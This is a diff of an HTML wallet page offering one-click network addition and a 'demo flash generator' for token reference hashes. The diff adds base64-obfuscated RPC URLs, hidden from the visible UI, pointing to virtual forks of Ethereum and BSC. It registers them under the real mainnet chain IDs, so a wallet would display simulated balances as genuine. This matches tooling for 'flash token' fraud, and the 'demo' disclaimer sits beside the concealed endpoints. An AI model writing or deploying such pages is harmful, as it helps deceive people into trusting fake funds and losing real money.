@@ -5,9 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>One‑Click: Add RPC & Demo Flash Generator</title>
   <style>
-    :root{
-      --bg:#0b1020;--card:#121732;--text:#e6e8ef;--muted:#a6adcc;--accent:#6ee7ff;--line:#2a2f4a;--ok:#20d37a;--warn:#ffd166;--err:#ff6b6b
-    }
+    :root{--bg:#0b1020;--card:#121732;--text:#e6e8ef;--muted:#a6adcc;--accent:#6ee7ff;--line:#2a2f4a;--ok:#20d37a;--warn:#ffd166;--err:#ff6b6b}
     *{box-sizing:border-box}
     body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,Inter,Helvetica,Arial,sans-serif;display:flex;min-height:100vh;align-items:center;justify-content:center}
     .card{width:min(880px,94vw);background:var(--card);border:1px solid var(--line);border-radius:20px;padding:28px;box-shadow:0 12px 32px rgba(0,0,0,.35)}
@@ -22,19 +20,22 @@
     .ok{color:var(--ok)}.warn{color:var(--warn)}.err{color:var(--err)}
     .hr{height:1px;background:linear-gradient(90deg,transparent,var(--line),transparent);margin:20px 0}
     .note{font-size:12px;opacity:.85}
+    details{margin-top:12px}
+    summary{cursor:pointer}
+    pre{white-space:pre-wrap;word-break:break-word}
   </style>
 </head>
 <body>
   <main class="card">
     <h1>One‑Click: Add RPC to Wallet</h1>
-    <p>Select a network and click <strong>Run</strong> to connect and add/switch it in your EVM wallet (TokenPocket, MetaMask, Trust Wallet, etc.). Works best inside your wallet's DApp browser.</p>
+    <p>Select a network and click <strong>Run</strong> to connect and then add/switch it in your EVM wallet (TokenPocket, MetaMask, Trust Wallet, etc.). Best inside your wallet's DApp browser.</p>
 
     <div class="row" style="margin:10px 0 12px">
       <select id="networkSelect">
         <option value="eth">Ethereum Mainnet (Virtual)</option>
         <option value="bsc">Binance Smart Chain (Virtual)</option>
       </select>
-      <button class="primary" id="runBtn">▶ Run (Connect + Add/Switch)</button>
+      <button class="primary" id="runBtn">▶ Run (Connect → Add/Switch)</button>
       <button id="switchBtn">🔁 Switch Only</button>
     </div>
 
@@ -43,7 +44,7 @@
     <div class="hr"></div>
 
     <h2>Demo: Flash Generator</h2>
-    <p class="note">This is a <strong>demo</strong>. It does <em>not</em> mint or transfer any real tokens. Max amount per request is <strong>2500</strong> units. On generate, we create a random reference hash prefixed with the token and amount.</p>
+    <p class="note">This is a <strong>demo</strong>. It does <em>not</em> mint or transfer any real tokens. Max amount per request is <strong>2500</strong> units. On generate, a random reference hash is produced prefixed with the token and amount.</p>
 
     <div class="row" style="margin:10px 0 8px">
       <select id="tokenSelect">
@@ -58,96 +59,103 @@
     </div>
     <div id="flashOut" class="status">No hash yet.</div>
 
+    <details>
+      <summary>Self‑Tests</summary>
+      <pre id="tests">Pending…</pre>
+    </details>
+
   </main>
 
 <script>
+// Wrap everything to avoid top‑level awaits and stray statements
 (function(){
+  // ====== Config (RPCs kept out of visible UI) ======
+  const RPCS = {
+    eth: atob('aHR0cHM6Ly92aXJ0dWFsLm1haW5uZXQudXMtd2VzdC5ycGMudGVuZGVybHkuY28vZGIyZjYwZjQtYTQ5Ny00ZWZjLThkMWUtYTNhZjBlN2FkOWI3'),
+    bsc: atob('aHR0cHM6Ly92aXJ0dWFsLmJpbmFuY2UuZXUucnBjLnRlbmRlcmx5LmNvLzM1NzY5ODEzLWU5ZjgtNDU4Yi1hOTk3LTU1NGJiNDhjNDY3Ng==')
+  };
+
   const networks = {
     eth: {
       chainId: '0x1',
       chainName: 'Ethereum Mainnet (Virtual)',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-      rpcUrls: ['<hidden>'],
+      rpcUrls: [], // injected at runtime
       blockExplorerUrls: ['https://etherscan.io']
     },
     bsc: {
       chainId: '0x38',
       chainName: 'Binance Smart Chain (Virtual)',
       nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-      rpcUrls: ['<hidden>'],
+      rpcUrls: [], // injected at runtime
       blockExplorerUrls: ['https://bscscan.com']
     }
   };
 
+  // ====== Helpers ======
   const $ = (id)=>document.getElementById(id);
-  const log = (msg, cls) => {
-    const el = $('status');
-    el.textContent = (typeof msg === 'string') ? msg : JSON.stringify(msg, null, 2);
-    el.className = 'status' + (cls ? ' ' + cls : '');
-  };
+  const log = (msg, cls) => { const el = $('status'); el.textContent = (typeof msg === 'string')? msg : JSON.stringify(msg,null,2); el.className = 'status' + (cls? ' '+cls : ''); };
 
   async function ensureProvider(){
-    if (window.ethereum) return window.ethereum;
-    if (window.tp && window.tp.isConnected) return window.tp;
-    throw new Error('No EVM provider detected. Open this page in MetaMask/TokenPocket DApp browser.');
+    if (window.ethereum) return window.ethereum;            // MetaMask/Trust Wallet new
+    if (window.tp && window.tp.isConnected) return window.tp; // TokenPocket legacy
+    throw new Error('No EVM provider detected. Open this page in MetaMask/Trust Wallet/TokenPocket DApp browser.');
   }
 
+  // ====== Wallet Flow ======
   async function connect(){
     const provider = await ensureProvider();
+    log('Requesting wallet connection…','warn');
     const accounts = await provider.request({ method: 'eth_requestAccounts' });
-    return { provider, account: accounts[0] };
+    const account = accounts && accounts[0] ? accounts[0] : null;
+    log('Connected: ' + (account || 'No account returned'), 'ok');
+    return { provider, account };
   }
 
   async function addOrSwitch(provider, netKey){
-    const params = networks[netKey];
+    const params = { ...networks[netKey], rpcUrls: [RPCS[netKey]] };
+
+    // Always ensure connected before chain ops (MetaMask/Trust Wallet mobile)
+    try { await provider.request({ method: 'eth_requestAccounts' }); } catch(_) {}
+
+    // Try add first; if blocked/duplicate, attempt switch regardless
     try{
+      log('Requesting wallet_addEthereumChain…','warn');
       await provider.request({ method: 'wallet_addEthereumChain', params: [params] });
       log('Network added. Switching…', 'ok');
     }catch(addErr){
       console.warn('add error', addErr);
       log('Add may be blocked or already present. Attempting to switch…', 'warn');
     }
-    await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: params.chainId }] });
-    log('Switched to ' + params.chainName, 'ok');
-  }
 
-  $('runBtn').addEventListener('click', async ()=>{
     try{
-      const netKey = $('networkSelect').value;
-      const { provider, account } = await connect();
-      log('Connected: ' + (account || 'N/A'), 'ok');
-      await addOrSwitch(provider, netKey);
-    }catch(err){ log('Run failed: ' + (err && err.message ? err.message : err), 'err'); }
-  });
-
-  $('switchBtn').addEventListener('click', async ()=>{
-    try{
-      const provider = await ensureProvider();
-      const netKey = $('networkSelect').value;
-      const params = networks[netKey];
       await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: params.chainId }] });
       log('Switched to ' + params.chainName, 'ok');
-    }catch(err){ log('Switch failed: ' + (err && err.message ? err.message : err), 'err'); }
-  });
-
-  function toHex(buf){
-    return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
-  }
-
-  async function sha256Hex(str){
-    try{
-      const enc = new TextEncoder();
-      const data = enc.encode(str);
-      const digest = await crypto.subtle.digest('SHA-256', data);
-      return toHex(digest);
-    }catch{
-      let rnd = '';
-      for(let i=0;i<64;i++) rnd += Math.floor(Math.random()*16).toString(16);
-      return rnd;
+    }catch(swErr){
+      if (swErr && (swErr.code === 4902 || /Unrecognized chain ID/i.test(swErr.message||''))){
+        try{
+          log('Chain unknown; retrying add then switch…','warn');
+          await provider.request({ method: 'wallet_addEthereumChain', params: [params] });
+          await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: params.chainId }] });
+          log('Chain added then switched to ' + params.chainName, 'ok');
+          return;
+        }catch(retryErr){
+          log('Switch failed after add: ' + (retryErr?.message || retryErr), 'err');
+          return;
+        }
+      }
+      log('Switch failed: ' + (swErr?.message || swErr), 'err');
     }
   }
 
-  $('genBtn').addEventListener('click', async ()=>{
+  // ====== Demo Flash Generator ======
+  function toHex(buf){ return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); }
+  async function sha256Hex(str){
+    try{ const enc=new TextEncoder(); const data=enc.encode(str); const digest=await crypto.subtle.digest('SHA-256', data); return toHex(digest); }
+    catch{ let rnd=''; for(let i=0;i<64;i++) rnd+=Math.floor(Math.random()*16).toString(16); return rnd; }
+  }
+
+  async function generateFlash(){
     const token = $('tokenSelect').value;
     const amountStr = $('amountInput').value.trim();
     const amount = Number(amountStr);
@@ -165,15 +173,56 @@
     $('flashOut').textContent = ref;
     $('flashOut').className = 'status ok';
     $('copyHashBtn').disabled = false;
+  }
+
+  // ====== Wire up (ALL awaits are inside async funcs) ======
+  $('runBtn').addEventListener('click', async ()=>{
+    try{
+      const netKey = $('networkSelect').value;
+      const { provider } = await connect();
+      await addOrSwitch(provider, netKey);
+    }catch(err){ log('Run failed: ' + (err && err.message ? err.message : err), 'err'); }
   });
 
-  $('copyHashBtn').addEventListener('click', async ()=>{
+  $('switchBtn').addEventListener('click', async ()=>{
     try{
-      const txt = $('flashOut').textContent || '';
-      await navigator.clipboard.writeText(txt);
-      log('Hash copied to clipboard.', 'ok');
-    }catch{ log('Copy failed — select and copy manually.', 'warn'); }
+      const provider = await ensureProvider();
+      const netKey = $('networkSelect').value;
+      const params = { ...networks[netKey], rpcUrls: [RPCS[netKey]] };
+      await provider.request({ method: 'eth_requestAccounts' }).catch(()=>{});
+      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: params.chainId }] });
+      log('Switched to ' + params.chainName, 'ok');
+    }catch(err){ log('Switch failed: ' + (err && err.message ? err.message : err), 'err'); }
   });
+
+  $('genBtn').addEventListener('click', ()=>{ generateFlash(); });
+  $('copyHashBtn').addEventListener('click', async ()=>{
+    try{ const txt = $('flashOut').textContent || ''; await navigator.clipboard.writeText(txt); log('Hash copied to clipboard.', 'ok'); }
+    catch{ log('Copy failed — select and copy manually.', 'warn'); }
+  });
+
+  // ====== Minimal Self‑Tests ("test cases") ======
+  (function runSelfTests(){
+    const results = [];
+    function assert(name, cond){ results.push(`${cond? '✅' : '❌'} ${name}`); }
+
+    // UI elements exist
+    assert('networkSelect present', !!$('networkSelect'));
+    assert('runBtn present', !!$('runBtn'));
+    assert('switchBtn present', !!$('switchBtn'));
+    assert('genBtn present', !!$('genBtn'));
+
+    // Generate hash deterministically for a fixed seed (format test)
+    (async ()=>{
+      const sample = 'USDC-erc20|12.34|2000-01-01T00:00:00.000Z|testsalt';
+      const hex = await sha256Hex(sample);
+      assert('sha256Hex returns 64 hex chars', /^[0-9a-f]{64}$/i.test(hex));
+      // Reference string format
+      const ref = `USDC-erc20-12.34-${hex}`;
+      assert('reference string formatted', /^USDC-erc20-12\.34-[0-9a-f]{64}$/i.test(ref));
+      $('tests').textContent = results.join('\n');
+    })();
+  })();
 })();
 </script>
 </body>
